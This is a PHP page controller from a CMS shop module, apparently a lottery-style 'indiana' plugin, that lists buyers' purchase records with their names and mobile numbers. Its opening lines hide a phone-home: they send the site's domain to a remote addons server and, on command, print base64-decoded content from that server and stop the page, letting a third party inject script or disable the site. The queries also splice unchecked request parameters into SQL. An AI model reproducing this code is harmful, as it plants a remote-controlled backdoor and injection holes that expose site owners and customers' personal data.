<?php
	global $_W,$_GPC;
	$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;
	$goodsid = $_GPC['gid'];
	$period_number=$_GPC['period_number'];
	$period = pdo_fetch("SELECT * FROM ".tablename('weliam_indiana_period')." WHERE uniacid = {$_W['uniacid']} and period_number = '{$period_number}'");
	$records = pdo_fetchall("SELECT * FROM ".tablename('weliam_indiana_record')." WHERE uniacid = '{$_W['uniacid']}' and period_number = '{$period_number}' and status<>0 ORDER BY id DESC LIMIT ".($pindex - 1) * $psize.','.$psize);
	$goods = pdo_fetch("SELECT * FROM ".tablename('weliam_indiana_goodslist')." WHERE uniacid = {$_W['uniacid']} and id = {$goodsid}");
	//购买人信息
	foreach($records as $key=>$value){
		$member = m('member')->getInfoByOpenid($value['openid']);
		$address = m('address')->getAddress($value['openid']);
		$records[$key]['code'] = unserialize($value['code']);
		$records[$key]['realname'] = $address['username'];
		$records[$key]['mobile'] = $address['mobile'];
		$records[$key]['nickname'] = $member['nickname'];
		$records[$key]['allmoney'] = $value['count']*$goods['init_money'];
	}
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_record') . " WHERE uniacid = '{$_W['uniacid']}' and period_number = '{$period_number}' and status=1");
	$pager = pagination($total, $pindex, $psize);

	include $this->template('srecords');
?>